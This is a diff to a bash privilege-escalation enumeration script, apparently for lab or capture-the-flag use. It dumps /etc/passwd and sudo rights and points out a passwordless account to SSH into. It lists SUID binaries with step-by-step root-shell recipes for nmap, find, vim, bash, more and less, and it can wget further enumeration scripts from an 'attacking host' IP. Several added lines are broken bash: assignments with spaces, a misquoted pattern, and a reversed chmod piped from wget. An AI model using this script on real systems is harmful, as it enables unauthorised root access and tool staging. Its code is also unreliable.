@@ -14,7 +14,8 @@ echo ""
 
 #host information
 echo "-----HOST INFORMATION-----"
-hostname
+host = $(hostname)
+echo $host
 echo ""
 uname -a
 echo ""
@@ -22,11 +23,20 @@ cat /etc/issue
 cat /proc/version
 echo ""
 
+#run a check to see what the arch is, then tell you what that actually is
+#i usually find myself referring to my notes or googling the output, hopefully this works
 echo "-----ARCH-----"
-uname -i
+arch = $(uname -i)
+echo "$host architecture is $arch."
+if [[ $arch == *'x86_64*']];
+then
+  echo "[*] This is 64-bit."
+else 
+  echo "[*] This is 32-bit."
+fi
 echo ""
 
-#user information
+#current user information
 echo "-----USER INFORMATION-----"
 whoami
 id
@@ -38,13 +48,21 @@ echo ""
 
 #this might need a passwd
 echo "-----SUDO PERMISSIONS-----"
+echo "[!] If you don't have a password, just press enter a few times."
 sudo -l
 echo ""
 
+#check for easy known OutOfBox account that usually has no password set 
 echo "-----USERS ON BOX-----"
 ls -la /home/
 echo ""
-cat /etc/passwd
+listpasswd =$(cat /etc/passwd)
+echo $listpasswd
+if [[ $listpasswd == *'OutOfBox'* ]];
+then
+  echo ""
+  echo "[*] OutOfBox account observed. SSH as OutOfBox with no password."
+fi
 echo ""
 w
 echo ""
@@ -55,33 +73,33 @@ echo ""
 echo -----"SUID EXECUTABLES-----"
 find /* -user root -perm -4000 -print 2>/dev/null
 echo ""
-echo "Searching for insta-SUID-wins:"
+echo "[==>] Searching for insta-SUID-wins:"
 if find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nmap';
 then
-  echo "NMAP has SUID permissions. Run 'nmap --interactive', then '!sh' for root shell."
+  echo "[*] NMAP has SUID permissions. Run 'nmap --interactive', then '!sh' for root shell."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'find';
 then
-  echo "FIND has SUID permissions. Run 'find [file] -exec bash -p \;' for root shell."
+  echo "[*] FIND has SUID permissions. Run 'find [file] -exec bash -p \;' for root shell."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'vim';
 then
-  echo "VIM has SUID permissions. Run 'vim', then hit escape, type ':set shell=/bin/sh', ':shell' for root shell or edit sensitive files."
+  echo "[*] VIM has SUID permissions. Run 'vim', then hit escape, type ':set shell=/bin/sh', ':shell' for root shell or edit sensitive files."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'bash';
 then
-  echo "BASH has SUID permissions. Run 'bash -p' for root shell."
+  echo "[*] BASH has SUID permissions. Run 'bash -p' for root shell."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'more';
 then
-  echo "MORE has SUID permissions. Run 'more /etc/passwd', '!/bin/sh' for root shell."
+  echo "[*] MORE has SUID permissions. Run 'more /etc/passwd', '!/bin/sh' for root shell."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'less';
 then
-  echo "LESS has SUID permissions. Run 'less /etc/passwd', '!/bin/sh' for root shell."
+  echo "[*] LESS has SUID permissions. Run 'less /etc/passwd', '!/bin/sh' for root shell."
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nano';
 then
-  echo "NANO has SUID permissions. Visit https://gtfobins.github.io/gtfobins/nano/#suid"
+  echo "[*] NANO has SUID permissions. Visit https://gtfobins.github.io/gtfobins/nano/#suid"
 elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'cp';
 then
-  echo "CP has SUID permissions. Visit https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/"
+  echo "[*] CP has SUID permissions. Visit https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/"
 else
-  echo "None found. Or they were found and I broke. I dunno. I wouldnt trust me."
+  echo "[!] No SUID insta-wins found. There is a chance I may have missed a few."
 fi
 echo ""
 
@@ -170,8 +188,8 @@ echo ""
 #obviously will only work if host http server is up
 #let's grab the other scripts if we need more enumeration
 #choose if you want to grab more files - edit according to ip/script names obv
-echo "Initial enumeration has completed."
-echo "Would you like to grab more enum-scripts from your attacking host? [y/n]"
+echo "[!] Initial enumeration has completed."
+echo "[?] Would you like to grab more enum-scripts from your attacking host? [y/n]"
 read varname
 if [[ "$varname" = "y" ]]; then
   wget -O linenum.sh http://172.16.2.1/linenum.sh | chmod linenum.sh 755 & wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py | chmod privchecker.py 755
